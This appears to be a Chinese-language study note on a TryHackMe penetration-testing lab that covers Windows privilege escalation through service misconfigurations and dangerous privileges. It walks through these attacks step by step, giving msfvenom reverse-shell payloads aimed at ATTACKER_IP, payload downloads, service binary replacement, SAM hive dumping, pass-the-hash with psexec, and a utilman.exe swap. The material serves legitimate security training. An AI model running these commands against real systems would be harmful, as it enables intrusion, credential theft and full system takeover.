<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc qc WindowsScheduler</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: windowsscheduler</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : System Scheduler Service</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : .\svcuser1</span><br></pre></td></tr></table></figure>

<p>我们可以看到漏洞软件安装的服务以svcuser1身份运行，并且与该服务关联的可执行文件位于 <code>C:\Progra~2\System~1\WService.exe</code> ，然后我们继续检查可执行文件的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\thm-unpriv&gt;icacls C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)</span><br><span class="line">                                  NT AUTHORITY\SYSTEM:(I)(F)</span><br><span class="line">                                  BUILTIN\Administrators:(I)(F)</span><br><span class="line">                                  BUILTIN\Users:(I)(RX)</span><br><span class="line">                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)</span><br><span class="line">                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>

<p>这里有一些有趣的事情。 Everyone 组对服务的可执行文件具有修改权限 (M)。这意味着我们可以简单地用我们偏好的任何有效负载覆盖它，并且该服务将使用配置的用户帐户的权限执行它。</p>
<p>让我们使用 msfvenom 生成一个 exe-service 有效负载，并通过 python Web 服务器提供它：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br></pre></td></tr></table></figure>

<p>然后我们可以使用以下命令从 Powershell 中提取有效负载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe</span><br></pre></td></tr></table></figure>

<p>一旦有效负载位于 Windows 服务器中，我们就继续用有效负载替换服务可执行文件。由于我们需要另一个用户来执行我们的有效负载，因此我们还希望向Everyone组授予完全权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; cd C:\PROGRA~2\SYSTEM~1\</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move WService.exe WService.exe.bkp</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move C:\Users\thm-unpriv\rev-svc.exe WService.exe</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F</span><br><span class="line">        Successfully processed 1 files.</span><br></pre></td></tr></table></figure>

<p>我们在攻击者机器上启动一个反向侦听器</p>
<p>最后，重新启动服务。虽然在正常情况下，您可能需要等待服务重新启动，但您已被分配了自行重新启动服务的权限，以节省一些时间。从 cmd.exe 命令提示符使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc stop windowsscheduler</span><br><span class="line">C:\&gt; sc start windowsscheduler</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> PowerShell将<code>sc</code>作为<code>Set-Content</code>别名，因此您需要使用<code>sc.exe</code>才能以这种方式使用PowerShell控制服务。</p>
<p>打开靶机，RDP连接查看服务配置</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004183052333.png"></p>
<p>继续检查可执行文件的权限</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004183213556.png"></p>
<p>发现对所有人对服务的可执行文件具有修改权限 (M)，使用msf生成payload传到靶机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.250.46 LPORT=4445 -f exe-service -o rev-svc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004195936587.png"></p>
<p>然后把原来的WService文件备份，将payload文件名改为WService并赋予完全F权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move WService.exe WService.exe.bkp</span><br><span class="line">move C:\Users\thm-unpriv\rev-svc.exe WService.exe</span><br><span class="line">icacls WService.exe /grant Everyone:F</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004200105761.png"></p>
<p>然后开启http监听，重启下服务成功接收shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop windowsscheduler</span><br><span class="line">sc start windowsscheduler</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004200249281.png"></p>
<h5 id="未加引号的服务路径"><a href="#未加引号的服务路径" class="headerlink" title="未加引号的服务路径"></a>未加引号的服务路径</h5><p>当我们无法像以前一样直接写入服务可执行文件时，仍然有机会通过使用相当模糊的功能来强制服务运行任意可执行文件。</p>
<p>使用 Windows 服务时，当服务配置为指向“未加引号”的可执行文件时，会出现非常特殊的行为。不加引号是指未正确引用关联可执行文件的路径来解释命令中的空格。</p>
<p>作为示例，让我们看一下两个服务之间的区别（这些服务仅用作示例，可能在您的计算机中不可用）。第一个服务将使用正确的引用，以便 SCM 毫无疑问地知道它必须执行由 <code>&quot;C:\Program Files\RealVNC\VNC Server\vncserver.exe&quot;</code> ，后跟给定的参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc qc &quot;vncserver&quot;</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: vncserver</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : &quot;C:\Program Files\RealVNC\VNC Server\vncserver.exe&quot; -service</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : VNC Server</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>

<p><strong>请记住：PowerShell 将“sc”作为“Set-Content”的别名，因此，如果您处于PowerShell提示符中，则需要使用“sc.exe”来控制服务。</strong><br>现在让我们看看另一项没有正确引用的服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc qc &quot;disk sorter enterprise&quot;</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: disk sorter enterprise</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Disk Sorter Enterprise</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : .\svcusr2</span><br></pre></td></tr></table></figure>

<p>当 SCM 尝试执行关联的二进制文件时，就会出现问题。由于“Disk Sorter Enterprise”文件夹的名称上有空格，因此该命令变得不明确，并且 SCM 不知道您正在尝试执行以下哪一个</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Argument 1</th>
<th>Argument 2</th>
</tr>
</thead>
<tbody><tr>
<td>C:\MyPrograms\Disk.exe</td>
<td>Sorter</td>
<td>Enterprise\bin\disksrs.exe</td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter.exe</td>
<td>Enterprise\bin\disksrs.exe</td>
<td></td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>这与命令提示符如何解析命令有关。通常，当您发送命令时，空格将用作参数分隔符，除非它们是带引号的字符串的一部分。这意味着未加引号的命令的“正确”解释是执行<code>C:\MyPrograms\Disk.exe</code>并将其余部分作为参数。</p>
<p>SCM 没有像它可能应该发生的那样失败，而是尝试帮助用户并开始按照表中所示的顺序搜索每个二进制文件：</p>
<ol>
<li>首先，搜索<code>C:\MyPrograms\Disk.exe</code> 。如果存在，该服务将运行此可执行文件。</li>
<li>如果后者不存在，则会搜索 <code>C:\MyPrograms\Disk Sorter.exe</code> 。如果存在，该服务将运行此可执行文件。</li>
<li>如果后者不存在，则会搜索 <code>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</code> 。此选项预计会成功，并且通常会在默认安装中运行。</li>
</ol>
<p>从这个行为来看，问题就显而易见了。如果攻击者创建了在预期服务可执行文件之前搜索的任何可执行文件，他们就可以强制服务运行任意可执行文件。</p>
<p>虽然这听起来微不足道，但默认情况下，大多数服务可执行文件将安装在<code>C:\Program Files</code>或<code>C:\Program Files (x86)</code>下，非特权用户无法写入。这可以防止任何易受攻击的服务被利用。此规则也有例外：</p>
<ul>
<li>某些安装程序更改已安装文件夹的权限，使服务容易受到攻击。</li>
<li>管理员可能决定将服务二进制文件安装在非默认路径中。如果这样的路径是全局可写的，则该漏洞可以被利用。</li>
</ul>
<p>在我们的例子中，管理员将磁盘排序器二进制文件安装在<code>c:\MyPrograms</code>下。默认情况下，它继承<code>C:\</code>目录的权限，允许任何用户在其中创建文件和文件夹。我们可以使用<code>icacls</code>检查这一点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;icacls c:\MyPrograms</span><br><span class="line">c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)</span><br><span class="line">              BUILTIN\Administrators:(I)(OI)(CI)(F)</span><br><span class="line">              BUILTIN\Users:(I)(OI)(CI)(RX)</span><br><span class="line">              BUILTIN\Users:(I)(CI)(AD)</span><br><span class="line">              BUILTIN\Users:(I)(CI)(WD)</span><br><span class="line">              CREATOR OWNER:(I)(OI)(CI)(IO)(F)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>

<p><code>BUILTIN\Users</code>组具有<strong>AD</strong>和<strong>WD</strong>权限，允许用户分别创建子目录和文件。我们可以看看当前用户的所属用户组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups</span><br></pre></td></tr></table></figure>

<p>如果具有足够的权限，使用 msfvenom 创建 exe-service Payload 并将其传输到目标主机的过程与以前相同，因此请像以前一样创建以下 Payload 并将其上传到服务器。我们还将启动一个侦听器来接收反向 shell 执行时的情况：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe</span><br></pre></td></tr></table></figure>

<p>一旦有效负载进入服务器，请将其移动到可能发生劫持的任何位置。在这种情况下，我们将把有效负载移动到<code>C:\MyPrograms\Disk.exe</code> 。我们还将授予每个人对该文件的完全权限，以确保该服务可以执行该文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe</span><br><span class="line"></span><br><span class="line">C:\&gt; icacls C:\MyPrograms\Disk.exe /grant Everyone:F</span><br><span class="line">        Successfully processed 1 files.</span><br></pre></td></tr></table></figure>

<p>服务重新启动后，您的有效负载应该执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc stop &quot;disk sorter enterprise&quot;</span><br><span class="line">C:\&gt; sc start &quot;disk sorter enterprise&quot;      </span><br></pre></td></tr></table></figure>

<p>结果，您将获得具有 svcusr2 权限的反向 shell</p>
<h5 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h5><p>如果服务的可执行 DACL 配置良好，并且正确引用了服务的二进制路径，您仍然有机会利用该服务。如果服务 DACL （不是服务的可执行DACL ）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向所需的任何可执行文件并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。</p>
<p>要从命令行检查服务 DACL，您可以使用 Sysinternals 套件中的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a> 。为了您的方便，可以在<code>C:\\tools</code>中获取副本。检查 thmservice 服务DACL 的命令是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\AccessChk&gt; accesschk64.exe -qlc thmservice</span><br><span class="line">  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_QUERY_STATUS</span><br><span class="line">        SERVICE_QUERY_CONFIG</span><br><span class="line">        SERVICE_INTERROGATE</span><br><span class="line">        SERVICE_ENUMERATE_DEPENDENTS</span><br><span class="line">        SERVICE_PAUSE_CONTINUE</span><br><span class="line">        SERVICE_START</span><br><span class="line">        SERVICE_STOP</span><br><span class="line">        SERVICE_USER_DEFINED_CONTROL</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></table></figure>

<p>在这里我们可以看到<code>BUILTIN\\Users</code>组具有SERVICE_ALL_ACCESS权限，这意味着任何用户都可以重新配置服务。</p>
<p>在更改服务之前，让我们构建另一个 exe-service 反向 shell，并在攻击者的计算机上启动它的侦听器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe</span><br><span class="line"></span><br><span class="line">user@attackerpc$ nc -lvp 4447    </span><br></pre></td></tr></table></figure>

<p>然后我们将反向 shell 可执行文件传输到目标机器并将其存储在 <code>C:\Users\thm-unpriv\rev-svc3.exe</code> 。请随意使用 wget 传输您的可执行文件并将其移动到所需的位置。请记住授予每个人执行您的有效负载的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F</span><br></pre></td></tr></table></figure>

<p>要更改服务关联的可执行文件和帐户，我们可以使用以下命令（使用 sc.exe 时请注意等号后面的空格）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc config THMService binPath= &quot;C:\Users\thm-unpriv\rev-svc3.exe&quot; obj= LocalSystem</span><br></pre></td></tr></table></figure>

<p>请注意，我们可以使用任何帐户来运行该服务。我们选择 LocalSystem，因为它是可用的最高特权帐户。要触发我们的有效负载，剩下的就是重新启动服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc stop THMService</span><br><span class="line">C:\&gt; sc start THMService</span><br></pre></td></tr></table></figure>

<p>我们将在攻击者的机器上收到一个具有系统权限的 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4447</span><br><span class="line">Listening on 0.0.0.0 4447</span><br><span class="line">Connection received on 10.10.175.90 50650</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<h4 id="Task6-滥用危险的特权"><a href="#Task6-滥用危险的特权" class="headerlink" title="Task6 滥用危险的特权"></a>Task6 滥用危险的特权</h4><h5 id="Windows-权限"><a href="#Windows-权限" class="headerlink" title="Windows 权限"></a>Windows 权限</h5><p>权限是帐户执行特定系统相关任务所拥有的权利。这些任务可以像关闭计算机的权限一样简单，也可以像绕过某些基于DACL的访问控制的权限一样简单。</p>
<p>每个用户都有一组分配的权限，可以使用以下命令进行检查：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">此处</a>提供了 Windows 系统上可用权限的完整列表。从攻击者的角度来看，只有那些允许我们在系统中升级的特权才有意义。您可以在<a target="_blank" rel="noopener" href="https://github.com/gtworek/Priv2Admin">Priv2Admin</a> Github 项目上找到可利用权限的完整列表。</p>
<p>虽然我们不会逐一查看，但我们将展示如何滥用您可以找到的一些最常见的特权。</p>
<h5 id="SeBackup-SeRestore提权"><a href="#SeBackup-SeRestore提权" class="headerlink" title="SeBackup &#x2F; SeRestore提权"></a>SeBackup &#x2F; SeRestore提权</h5><p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，忽略任何DACL 。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。</p>
<p>有了这种能力，攻击者可以使用多种技术轻松提升系统权限。我们将研究的方法包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希值。</p>
<p>使用以下凭据通过RDP登录到目标计算机：</p>
<p><strong>用户：</strong> <code>THMBackup</code> </p>
<p><strong>密码：</strong> <code>CopyMaster555</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.255.156 /u:THMBackup /p:CopyMaster555</span><br></pre></td></tr></table></figure>

<p>该帐户属于“Backup Operators”组，默认情况下被授予 SeBackup 和 SeRestore 权限。我们需要使用“以管理员身份打开”选项打开命令提示符才能使用这些权限。我们将被要求再次输入密码以获得提升的控制台</p>
<p>进入命令提示符后，我们可以使用以下命令检查我们的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006105337684.png"></p>
<p>要备份 SAM 和 SYSTEM 哈希值，我们可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\THMBackup\system.hive</span><br><span class="line">reg save hklm\sam C:\Users\THMBackup\sam.hive     </span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006113324572.png"></p>
<p>这将创建几个包含注册表配置单元内容的文件。现在，我们可以使用 SMB 或任何其他可用方法将这些文件复制到攻击者计算机。对于 SMB，我们可以使用 impacket 的<code>smbserver.py</code>在 AttackBox 的当前目录中启动一个带有网络共享的简单SMB服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir share</span><br><span class="line">python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006113550704.png"></p>
<p>并使用 impacket 检索用户的密码哈希值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006113622837.png"></p>
<p>我们终于可以使用管理员的哈希来执行哈希传递攻击并获得具有系统权限的目标计算机的访问权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.255.156</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006113914630.png"></p>
<h5 id="SeTakeOwnership提权"><a href="#SeTakeOwnership提权" class="headerlink" title="SeTakeOwnership提权"></a>SeTakeOwnership提权</h5><p>SeTakeOwnership 权限允许用户获取系统上任何对象的所有权，包括文件和注册表项，这为攻击者提升权限提供了多种可能性，例如，我们可以搜索作为 SYSTEM 运行的服务并获取所有权服务的可执行文件。然而，对于这项任务，我们将采取不同的路线。</p>
<p>使用以下凭据通过RDP登录到目标计算机：</p>
<p><strong>用户：</strong> <code>THMTakeOwnership</code> </p>
<p><strong>密码：</strong> <code>TheWorldIsMine2022</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.255.156 /u:THMTakeOwnership /p:TheWorldIsMine2022</span><br></pre></td></tr></table></figure>

<p>要获得 SeTakeOwnership 权限，我们需要使用“以管理员身份打开”选项打开命令提示符。我们将被要求输入密码以获得提升的控制台</p>
<p>进入命令提示符后，我们可以使用以下命令检查我们的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006114614708.png"></p>
<p>这次我们将滥用<code>utilman.exe</code>来升级权限。 Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供“轻松访问”选项：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006114702894.png"></p>
<p>由于 Utilman 是以 SYSTEM 权限运行的，因此如果我们将原始二进制文件替换为我们喜欢的任何有效负载，我们将有效地获得 SYSTEM 权限。由于我们可以拥有任何文件的所有权，因此替换它是微不足道的。</p>
<p>要替换 utilman，我们将首先使用以下命令获取它的所有权：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">takeown /f C:\Windows\System32\Utilman.exe</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006114833726.png"></p>
<p>请注意，成为文件的所有者并不一定意味着您拥有该文件的权限，但作为所有者，您可以为自己分配所需的任何权限。要为您的用户授予 utilman.exe 的完全权限，您可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006115250040.png"></p>
<p>然后，我们将用 cmd.exe 的副本替换 utilman.exe：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy cmd.exe utilman.exe</span><br></pre></td></tr></table></figure>

<p>要触发 utilman，我们将从开始按钮锁定屏幕：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006115408435.png"></p>
<p>最后，继续单击“轻松访问”按钮，该按钮将以系统权限运行 utilman.exe。由于我们将其替换为 cmd.exe 副本，因此我们将获得具有 SYSTEM 权限的命令提示符：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006115354296.png"></p>
<h5 id="SeImpersonate-SeAssignPrimaryToken提权"><a href="#SeImpersonate-SeAssignPrimaryToken提权" class="headerlink" title="SeImpersonate &#x2F; SeAssignPrimaryToken提权"></a>SeImpersonate &#x2F; SeAssignPrimaryToken提权</h5><p>这些权限允许进程模拟其他用户并代表他们执行操作。模拟通常包括能够在另一个用户的安全上下文下生成进程或线程。</p>
<p>当您考虑FTP服务器的工作原理时，就很容易理解模拟。 FTP服务器必须限制用户只能访问他们应该被允许查看的文件。</p>
<p>假设我们有一个使用用户<code>ftp</code>运行的FTP服务。如果没有模拟，如果用户 Ann 登录 FTP 服务器并尝试访问她的文件，FTP 服务将尝试使用其访问令牌而不是 Ann 的访问令牌来访问它们：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006115703241.png"></p>
<p>使用 ftp 令牌不是最好的主意有几个原因： - 为了正确提供文件， <code>ftp</code>用户需要可以访问它们。在上面的示例中，FTP 服务将能够访问 Ann 的文件，但不能访问 Bill 的文件，因为 Bill 文件中的 DACL 不允许用户<code>ftp</code> 。这增加了复杂性，因为我们必须为每个提供的文件&#x2F;目录手动配置特定权限。 - 对于操作系统，所有文件均由用户<code>ftp</code>访问，与当前登录FTP服务的用户无关。这使得无法将授权委托给操作系统；因此， FTP服务必须实现它。 - 如果FTP服务在某个时刻遭到破坏，攻击者将立即获得对<code>ftp</code>用户有权访问的所有文件夹的访问权限。</p>
<p>另一方面，如果 FTP 服务的用户具有 SeImpersonate 或 SeAssignPrimaryToken 权限，则所有这些都会稍微简化，因为FTP服务可以临时获取登录用户的访问令牌，并使用它来执行其上的任何任务。代表：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006115813563.png"></p>
